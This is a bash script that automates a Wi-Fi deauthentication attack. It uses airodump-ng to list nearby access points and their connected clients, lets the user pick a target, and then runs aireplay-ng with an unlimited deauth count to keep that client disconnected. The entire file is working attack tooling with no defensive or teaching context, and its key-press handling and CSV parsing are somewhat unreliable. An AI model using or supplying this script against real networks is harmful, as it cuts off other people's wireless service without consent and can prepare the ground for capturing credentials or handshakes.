#!/bin/bash

# Define variables
INTERFACE="wlan1"  # Your monitor mode interface
SCAN_DURATION=10    # Duration to scan for APs in seconds
SCAN_FILE="/tmp/scan"
SCAN_PID=""

# Function to start scanning for APs
start_scan() {
    echo "Starting scan for surrounding devices..."
    sudo airodump-ng --output-format csv --write $SCAN_FILE --band abg $INTERFACE &
    SCAN_PID=$!
}

# Function to stop the scan
stop_scan() {
    echo "Stopping scan..."
    if [ ! -z "$SCAN_PID" ]; then
        sudo kill $SCAN_PID
        wait $SCAN_PID 2>/dev/null
    fi
    echo "Scan stopped."
}

# Function to handle user input
handle_input() {
    echo "Press Ctrl + F to stop scanning and select an AP."
    while true; do
        read -r -n1 input
        if [[ $input == "f" ]]; then
            stop_scan
            break
        fi
    done
}

# Function to display the list of APs and allow selection
select_ap() {
    echo "Available APs:"
    awk -F, 'NR > 2 {print NR-2 ": " $1 " - " $14}' ${SCAN_FILE}-01.csv | tee /dev/tty
    echo "Enter the number of the AP to target: "
    read AP_SELECTION
    BSSID=$(awk -F, 'NR=='$((AP_SELECTION + 2))'{print $1}' ${SCAN_FILE}-01.csv)
    ESSID=$(awk -F, 'NR=='$((AP_SELECTION + 2))'{print $14}' ${SCAN_FILE}-01.csv)

    if [[ -z "$BSSID" || "$BSSID" == "BSSID" ]]; then
        echo "Invalid AP selection. Exiting."
        exit 1
    fi

    echo "Selected AP: $ESSID ($BSSID)"
}

# Function to list clients associated with the selected AP
list_clients() {
    echo "Scanning for clients associated with $ESSID..."
    sudo airodump-ng --output-format csv --write /tmp/clients --bssid $BSSID $INTERFACE &
    CLIENT_SCAN_PID=$!
    sleep $SCAN_DURATION
    sudo kill $CLIENT_SCAN_PID
    wait $CLIENT_SCAN_PID 2>/dev/null
    echo "Client scan completed."
}

# Function to display the list of clients and allow selection
select_client() {
    echo "Available clients:"
    awk -F, 'NR > 2 {print NR-2 ": " $1 " - " $2}' /tmp/clients-01.csv | tee /dev/tty
    echo "Enter the number of the client to deauth: "
    read CLIENT_SELECTION
    CLIENT_MAC=$(awk -F, 'NR=='$((CLIENT_SELECTION + 2))'{print $2}' /tmp/clients-01.csv)

    if [[ -z "$CLIENT_MAC" || "$CLIENT_MAC" == "STATION" ]]; then
        echo "Invalid client selection. Exiting."
        exit 1
    fi

    echo "Selected client: $CLIENT_MAC"
}

# Function to deauthenticate clients
deauth_clients() {
    echo "Starting deauthentication attack on $BSSID ($ESSID)..."
    sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT_MAC $INTERFACE
    echo "Deauthentication attack completed."
}

# Main script execution
start_scan
handle_input
select_ap
list_clients
select_client
deauth_clients
